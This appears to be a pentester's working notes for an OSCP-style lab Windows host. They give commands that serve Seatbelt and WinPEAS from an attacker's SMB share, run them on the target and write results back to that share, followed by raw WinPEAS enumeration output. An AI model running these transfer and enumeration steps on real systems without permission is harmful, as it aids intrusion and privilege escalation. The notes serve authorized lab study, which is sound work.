# Local

## Auto w/ [Seatbelt](https://github.com/GhostPack/Seatbelt)

### 転送・実行

```zsh
# Attacker
mkdir share
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Seatbelt.exe -O share/Seatbelt.exe
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
net use \\192.168.49.104\share /user:username pw
cp \\192.168.49.104\share\Seatbelt.exe .
.\Seatbelt.exe -group=all | Tee-Object -FilePath \\192.168.49.104\share\seatbelt_result.txt
```

### 実行結果抽出

```powershell

```


## Auto w/ [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

### 転送・実行

```zsh
# Attacker
mkdir share
cp /usr/share/peass/winpeas/winPEASx64.exe share/
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
cd ~
net use \\192.168.49.104\share /user:username pw
cp \\192.168.49.104\share\winPEASx64.exe .
.\winPEASx64.exe | Tee-Object -FilePath \\192.168.49.104\share\peas_result.txt
```

### 実行結果抽出 -> 特になし

```powershell

```

---
---

## Manual

### ユーザー


---

### システム情報


---

### ネットワーク


---

### インストール済みアプリケーション


---

### 実行中のプロセス


---

### PowerShellログ


---

### サービス


---

### スケジュールタスク


---

### 興味深い情報


---
---

# AD

- AS-REP roastable、Kerberoastableは両方存在しない




---

# Seatbelt

## 記録用結果（長文注意）

```powershell

```



---

# WinPEAS

## 記録用総出力（長い）

```sh
 [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
     
               ((((((((((((((((((((((((((((((((
        (((((((((((((((((((((((((((((((((((((((((((
      ((((((((((((((**********/##########(((((((((((((   
    ((((((((((((********************/#######(((((((((((
    ((((((((******************/@@@@@/****######((((((((((
    ((((((********************@@@@@@@@@@/***,####((((((((((
    (((((********************/@@@@@%@@@@/********##(((((((((
    (((############*********/%@@@@@@@@@/************((((((((
    ((##################(/******/@@@@@/***************((((((
    ((#########################(/**********************(((((
    ((##############################(/*****************(((((
    ((###################################(/************(((((
    ((#######################################(*********(((((
    ((#######(,.***.,(###################(..***.*******(((((
    ((#######*(#####((##################((######/(*****(((((
    ((###################(/***********(##############()(((((
    (((#####################/*******(################)((((((
    ((((############################################)((((((
    (((((##########################################)(((((((
    ((((((########################################)(((((((
    ((((((((####################################)((((((((
    (((((((((#################################)(((((((((
        ((((((((((##########################)(((((((((
              ((((((((((((((((((((((((((((((((((((((
                 ((((((((((((((((((((((((((((((

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.

  WinPEAS-ng by @hacktricks_live

       /---------------------------------------------------------------------------------\
       |                             Do you like PEASS?                                  |
       |---------------------------------------------------------------------------------| 
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |
       |         Follow on Twitter         :     @hacktricks_live                        |
       |         Respect on HTB            :     SirBroccoli                             |
       |---------------------------------------------------------------------------------|
       |                                 Thank you!                                      |
       \---------------------------------------------------------------------------------/

  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
   Creating Dynamic lists, this could take a while, please wait...
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list (local only)...
   - Creating disabled users list...
   - Admin users list...
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...


════════════════════════════════════╣ System Information ╠════════════════════════════════════

╔══════════╣ Basic System Information
╚ Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits
    OS Name: Microsoft Windows 11 Enterprise
    OS Version: 10.0.22631 N/A Build 22631
    System Type: x64-based PC
    Hostname: WS26
    Domain Name: oscp.exam
    ProductName: Windows 10 Enterprise
    EditionID: Enterprise
    ReleaseId: 2009
    BuildBranch: ni_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 2
    SystemLang: en-US
    KeyboardLang: Japanese (Japan)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: True
    Current Time: 2/21/2026 7:16:25 PM
    HighIntegrity: False
    PartOfDomain: True
    Hotfixes: KB5044033 (10/9/2024), KB5027397 (7/4/2024), KB5044285 (10/9/2024), KB5046247 (10/9/2024), 


╔══════════╣ Showing All Microsoft Updates
   HotFix ID                :   KB2267602
   Installed At (UTC)       :   2/22/2026 11:01:54 AM
   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.

   =================================================================================================

   HotFix ID                :   KB2267602
   Installed At (UTC)       :   11/12/2024 2:50:21 AM
   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.

   =================================================================================================

   HotFix ID                :   KB2267602
   Installed At (UTC)       :   10/29/2024 2:56:03 PM
   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.

   =================================================================================================

   HotFix ID                :   KB2267602
   Installed At (UTC)       :   10/11/2024 9:26:30 AM
   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:17 AM
   Title                    :   9N8MHTPHNGVV-Microsoft.Windows.DevHome
   Client Application ID    :   Acquisition;DevHome_UO
   Description              :   9N8MHTPHNGVV-1152921505698356525

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:16 AM
   Title                    :   9NH2SW16MQ7F-Microsoft.WindowsAppRuntime.1.5
   Client Application ID    :   Acquisition;DevHome_UO
   Description              :   9NH2SW16MQ7F-1152921505698229012

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:16 AM
   Title                    :   9NBLGGH4RV3K-Microsoft.VCLibs.140.00.UWPDesktop
   Client Application ID    :   Acquisition;DevHome_UO
   Description              :   9NBLGGH4RV3K-1152921505697797915

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:00 AM
   Title                    :   9NTXGKQ8P7N0-MicrosoftWindows.CrossDevice
   Client Application ID    :   Acquisition;CrossDevice_UO
   Description              :   9NTXGKQ8P7N0-1152921505698361592

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:00 AM
   Title                    :   9NH2SW16MQ7F-Microsoft.WindowsAppRuntime.1.5
   Client Application ID    :   Acquisition;CrossDevice_UO
   Description              :   9NH2SW16MQ7F-1152921505698229012

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 5:20:00 AM
   Title                    :   9NBLGGH4RV3K-Microsoft.VCLibs.140.00.UWPDesktop
   Client Application ID    :   Acquisition;CrossDevice_UO
   Description              :   9NBLGGH4RV3K-1152921505697797915

   =================================================================================================

   HotFix ID                :   KB5044285
   Installed At (UTC)       :   10/10/2024 2:15:03 AM
   Title                    :   2024-10 Cumulative Update for Windows 11 Version 23H2 for x64-based Systems (KB5044285)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to resolve issues in Windows. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article for more information. After you install this item, you may have to restart your computer.

   =================================================================================================

   HotFix ID                :   KB4023057
   Installed At (UTC)       :   10/10/2024 1:19:52 AM
   Title                    :   2023-11 Update for Windows 11 Version 23H2 for x64-based Systems (KB4023057)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   A security issue has been identified in a Microsoft software product that could affect your system. You can help protect your system by installing this update from Microsoft. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article. After you install this update, you may have to restart your system.

   =================================================================================================

   HotFix ID                :   KB890830
   Installed At (UTC)       :   10/10/2024 1:19:48 AM
   Title                    :   Windows Malicious Software Removal Tool x64 - v5.129 (KB890830)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   After the download, this tool runs one time to check your computer for infection by specific, prevalent malicious software (including Blaster, Sasser, and Mydoom) and helps remove any infection that is found. If an infection is found, the tool will display a status report the next time that you start your computer. A new version of the tool will be offered every month. If you want to manually run the tool on your computer, you can download a copy from the Microsoft Download Center, or you can run an online version from microsoft.com. This tool is not a replacement for an antivirus product. To help protect your computer, you should use an antivirus product.

   =================================================================================================

   HotFix ID                :   KB5044033
   Installed At (UTC)       :   10/10/2024 1:18:32 AM
   Title                    :   2024-10 Cumulative Update for .NET Framework 3.5 and 4.8.1 for Windows 11, version 23H2 for x64 (KB5044033)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   A security issue has been identified in a Microsoft software product that could affect your system. You can help protect your system by installing this update from Microsoft. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article. After you install this update, you may have to restart your system.

   =================================================================================================

   HotFix ID                :   
   Installed At (UTC)       :   10/10/2024 1:18:02 AM
   Title                    :   Broadcom Inc. - Net - 1.9.19.0
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Broadcom Inc. Net  driver update released in  July 2024

   =================================================================================================

   HotFix ID                :   KB2267602
   Installed At (UTC)       :   10/10/2024 1:17:45 AM
   Title                    :   Security Intelligence Update for Microsoft Defender Antivirus - KB2267602 (Version 1.419.422.0) - Current Channel (Broad)
   Client Application ID    :   MoUpdateOrchestrator
   Description              :   Install this update to revise the files that are used to detect viruses, spyware, and other potentially unwanted software. Once you have installed this item, it cannot be removed.

   =================================================================================================


╔══════════╣ System Last Shutdown Date/time (from Registry)

    Last Shutdown Date/time        :    10/10/2024 7:50:09 PM

╔══════════╣ User Environment Variables
╚ Check for some passwords or keys in the env variables 
    COMPUTERNAME: WS26
    PSExecutionPolicyPreference: Bypass
    HOMEPATH: \Users\r.andrews
    LOCALAPPDATA: C:\Users\r.andrews\AppData\Local
    windir: C:\Windows
    PSModulePath: C:\Users\r.andrews\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\r.andrews\AppData\Local\Microsoft\WindowsApps;
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 6
    LOGONSERVER: \\DC20
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    HOMEDRIVE: C:
    SystemRoot: C:\Windows
    TEMP: C:\Users\R8A36~1.AND\AppData\Local\Temp
    SESSIONNAME: RDP-Tcp#0
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    FPS_BROWSER_APP_PROFILE_STRING: Internet Explorer
    APPDATA: C:\Users\r.andrews\AppData\Roaming
    PROCESSOR_REVISION: 4f01
    USERNAME: r.andrews
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    USERPROFILE: C:\Users\r.andrews
    CLIENTNAME: kali
    OS: Windows_NT
    USERDOMAIN_ROAMINGPROFILE: OSCP
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    ComSpec: C:\Windows\system32\cmd.exe
    SystemDrive: C:
    FPS_BROWSER_USER_PROFILE_STRING: Default
    ProgramFiles: C:\Program Files
    NUMBER_OF_PROCESSORS: 2
    TMP: C:\Users\R8A36~1.AND\AppData\Local\Temp
    ProgramData: C:\ProgramData
    ProgramW6432: C:\Program Files
    USERDNSDOMAIN: OSCP.EXAM
    USERDOMAIN: OSCP
    PUBLIC: C:\Users\Public
    EFC_4916: 1

╔══════════╣ System Environment Variables
╚ Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 6
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    PROCESSOR_REVISION: 4f01

╔══════════╣ Audit Settings
╚ Check what is being logged 
    Not Found

╔══════════╣ Audit Policy Settings - Classic & Advanced

╔══════════╣ WEF Settings
╚ Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

╔══════════╣ LAPS Settings
╚ If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

╔══════════╣ Wdigest
╚ If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wdigest
    Wdigest is not enabled

╔══════════╣ LSA Protection
╚ If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#lsa-protection
    LSA Protection is not enabled

╔══════════╣ Credentials Guard
╚ If enabled, a driver is needed to read LSASS memory https://book.hacktricks.wiki/windows-hardening/stealing-credentials/credentials-protections#credentials-guard
    CredentialGuard is not enabled
    Virtualization Based Security Status:      Not enabled
    Configured:                                False
    Running:                                   False

╔══════════╣ Cached Creds
╚ If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-credentials
    cachedlogonscount is 10

╔══════════╣ Enumerating saved credentials in Registry (CurrentPass)

╔══════════╣ AV Information
    Some AV was detected, search for bypasses
    Name: Windows Defender
    ProductEXE: windowsdefender://
    pathToSignedReportingExe: %ProgramFiles%\Windows Defender\MsMpeng.exe

╔══════════╣ Windows Defender configuration
  Local Settings
  Group Policy Settings

╔══════════╣ UAC Status
╚ If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#from-administrator-medium-to-high-integrity-level--uac-bypasss
    ConsentPromptBehaviorAdmin: 0 - No prompting
    EnableLUA: 0
    LocalAccountTokenFilterPolicy: 1
    FilterAdministratorToken: 1
      [*] EnableLUA != 1, UAC policies disabled.
      [+] Any local account can be used for lateral movement.

╔══════════╣ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.22621.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 209B

╔══════════╣ Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check

╔══════════╣ PS default transcripts history
╚ Read the PS history inside these files (if any)

╔══════════╣ HKCU Internet Settings
    CertificateRevocation: 1
    DisableCachingOfSSLPages: 0
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 10240
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    ZonesSecurityUpgrade: System.Byte[]
    WarnonZoneCrossing: 0
    EnableNegotiate: 1
    ProxyEnable: 0
    MigrateProxy: 1

╔══════════╣ HKLM Internet Settings
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

╔══════════╣ Drives Information
╚ Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 22 GB)(Permissions: Authenticated Users [Allow: AppendData/CreateDirectories])
    D:\ (Type: CDRom)

╔══════════╣ Checking WSUS
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus
    Not Found

╔══════════╣ Checking KrbRelayUp
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#krbrelayup
  The system is inside a domain (OSCP) so it could be vulnerable.
╚ You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges

╔══════════╣ Checking If Inside Container
╚ If the binary cexecsvc.exe or associated service exists, you are inside Docker 
You are NOT inside a container

╔══════════╣ Checking AlwaysInstallElevated
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
    AlwaysInstallElevated isn't available

╔══════════╣ Enumerate LSA settings - auth packages included

    auditbasedirectories                 :       0
    auditbaseobjects                     :       0
    Authentication Packages              :       msv1_0
    Bounds                               :       00-30-00-00-00-20-00-00
    crashonauditfail                     :       0
    fullprivilegeauditing                :       00
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Notification Packages                :       scecli
    Security Packages                    :       ""
    LsaPid                               :       748
    LsaCfgFlagsDefault                   :       0
    SecureBoot                           :       1
    ProductType                          :       4
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1
    RunAsPPL                             :       0
    IsPplAutoEnabled                     :       1
    SCENoApplyLegacyAuditPolicy          :       0
    TurnOffAnonymousBlock                :       0
    LsaConfigFlags                       :       0
    RunAsPPLBoot                         :       0

╔══════════╣ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)


  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)


  NTLM Auditing and Restrictions
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      : 

╔══════════╣ Display Local Group Policy settings - local users/machine
   Type             :     machine
   Display Name     :     Default Domain Policy
   Name             :     {31B2F340-016D-11D2-945F-00C04FB984F9}
   Extensions       :     [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
   File Sys Path    :     C:\Windows\system32\GroupPolicy\DataStore\0\sysvol\oscp.exam\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine
   Link             :     LDAP://DC=oscp,DC=exam
   GPO Link         :     Domain
   Options          :     All Sections Enabled

   =================================================================================================

   Type             :     user
   Display Name     :     Local Group Policy
   Name             :     Local Group Policy
   Extensions       :     [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F73-3407-48AE-BA88-E8213C6761F1}]
   File Sys Path    :     C:\Windows\System32\GroupPolicy\User
   Link             :     Local
   GPO Link         :     Local Machine
   Options          :     All Sections Enabled

   =================================================================================================


╔══════════╣ Potential GPO abuse vectors (applied domain GPOs writable by current user)
    No obvious GPO abuse via writable SYSVOL paths or GPCO membership detected.

╔══════════╣ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



╔══════════╣ Enumerating Printers (WMI)

╔══════════╣ Enumerating Named Pipes
  Name                                                                                                 CurrentUserPerms                                                       Sddl

  eventlog                                                                                             Everyone [Allow: WriteData/CreateFiles]                                O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  LOCAL\crashpad_3752_YXBGRVGITCBSAATA                                                                 r.andrews [Allow: AllAccess]                                           O:S-1-5-21-2481101513-2954867870-2660283483-1106G:DUD:(A;;FA;;;SY)(A;;FA;;;S-1-5-21-2481101513-2954867870-2660283483-1106)(A;;0x12019f;;;AC)

  vgauth-service                                                                                       Everyone [Allow: WriteData/CreateFiles]                                O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)


╔══════════╣ Enumerating AMSI registered providers
    Provider:       {2781761E-28E0-4109-99FE-B9D127C57AFE}
    Path:           

   =================================================================================================


╔══════════╣ Enumerating Sysmon configuration
      You must be an administrator to run this check

╔══════════╣ Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check

╔══════════╣ Installed .NET versions

  CLR Versions
   4.0.30319

  .NET Versions
   4.8.09032

  .NET & AMSI (Anti-Malware Scan Interface) support
      .NET version supports AMSI     : True
      OS supports AMSI               : True
        [!] The highest .NET version is enrolled in AMSI!


════════════════════════════════════╣ Interesting Events information ╠════════════════════════════════════

╔══════════╣ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials

      You must be an administrator to run this check

╔══════════╣ Printing Account Logon Events (4624) for the last 10 days.

      You must be an administrator to run this check

╔══════════╣ Process creation events - searching logs (EID 4688) for sensitive data.

      You must be an administrator to run this check

╔══════════╣ PowerShell events - script block logs (EID 4104) - searching for sensitive data.


╔══════════╣ Displaying Power off/on events for last 5 days



════════════════════════════════════╣ Users Information ╠════════════════════════════════════

╔══════════╣ Users
╚ Check if you have some admin equivalent privileges https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups
  Current user: r.andrews
  Current groups: Domain Users, Everyone, Builtin\Remote Desktop Users, Builtin\Remote Management Users, Users, Remote Interactive Logon, Interactive, Authenticated Users, This Organization, Local, Authentication authority asserted identity
   =================================================================================================

    WS26\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    WS26\DefaultAccount(Disabled): A user account managed by the system.
        |->Groups: System Managed Accounts Group
        |->Password: CanChange-NotExpi-NotReq

    WS26\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq

    WS26\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.
        |->Password: CanChange-NotExpi-Req


╔══════════╣ Current User Idle Time
   Current User   :     OSCP\r.andrews
   Idle Time      :     00h:01m:44s:203ms

╔══════════╣ Display Tenant information (DsRegCmd.exe /status)
   Tenant is NOT Azure AD Joined.

╔══════════╣ Current Token privileges
╚ Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation
    SeShutdownPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeUndockPrivilege: DISABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
    SeTimeZonePrivilege: DISABLED

╔══════════╣ Clipboard text

╔══════════╣ Logged users
    OSCP\r.andrews

╔══════════╣ Display information about local users
   Computer Name           :   WS26
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   2/21/2026 7:02:00 PM
   Logons Count            :   27
   Password Last Set       :   10/9/2024 10:41:39 AM

   =================================================================================================

   Computer Name           :   WS26
   User Name               :   DefaultAccount
   User Id                 :   503
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed by the system.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   WS26
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   WS26
   User Name               :   WDAGUtilityAccount
   User Id                 :   504
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed and used by the system for Windows Defender Application Guard scenarios.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   10/9/2024 1:44:21 PM

   =================================================================================================


╔══════════╣ RDP Sessions
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
    2         RDP-Tcp#0      r.andrews      OSCP                     Active    192.168.49.104

╔══════════╣ Ever logged users
    WS26\Administrator
    OSCP\r.andrews

╔══════════╣ Home folders found
    C:\Users\Administrator
    C:\Users\All Users
    C:\Users\Default
    C:\Users\Default User
    C:\Users\Public : Interactive [Allow: WriteData/CreateFiles]
    C:\Users\r.andrews : r.andrews [Allow: AllAccess]

╔══════════╣ Looking for AutoLogon credentials
    Not Found

╔══════════╣ Password Policies
╚ Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: DOMAIN_LOCKOUT_ADMINS
   =================================================================================================

    Domain: WS26
    SID: S-1-5-21-2756297892-2186407355-380279769
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 1.00:00:00
    MinPasswordLength: 7
    PasswordHistoryLength: 24
    PasswordProperties: DOMAIN_LOCKOUT_ADMINS
   =================================================================================================


╔══════════╣ Print Logon Sessions
    Method:                       WMI
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     2695985
    Logon Time:                   
    Logon Type:                   RemoteInteractive
    Start Time:                   2/21/2026 7:03:11 PM
    Domain:                       OSCP
    Authentication Package:       Kerberos
    Start Time:                   2/21/2026 7:03:11 PM
    User Name:                    r.andrews
    User Principal Name:          
    User SID:                     

   =================================================================================================

    Method:                       WMI
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     2636154
    Logon Time:                   
    Logon Type:                   Network
    Start Time:                   2/21/2026 7:03:05 PM
    Domain:                       OSCP
    Authentication Package:       NTLM
    Start Time:                   2/21/2026 7:03:05 PM
    User Name:                    r.andrews
    User Principal Name:          
    User SID:                     

   =================================================================================================



════════════════════════════════════╣ Processes Information ╠════════════════════════════════════

╔══════════╣ Interesting Processes -non Microsoft-
╚ Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#running-processes
    rdpclip(6920)[C:\Windows\System32\rdpclip.exe] -- POwn: r.andrews
    Command Line: rdpclip
   =================================================================================================

    explorer(4916)[C:\Windows\Explorer.EXE] -- POwn: r.andrews
    Command Line: C:\Windows\Explorer.EXE
   =================================================================================================

    msedgewebview2(8588)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=gpu-process --noerrdialogs --user-data-dir="C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --embedded-browser-webview=1 --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=1868 --field-trial-handle=1976,i,4625114672856337207,10407072770365691567,131072 --enable-features=UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:2
   =================================================================================================

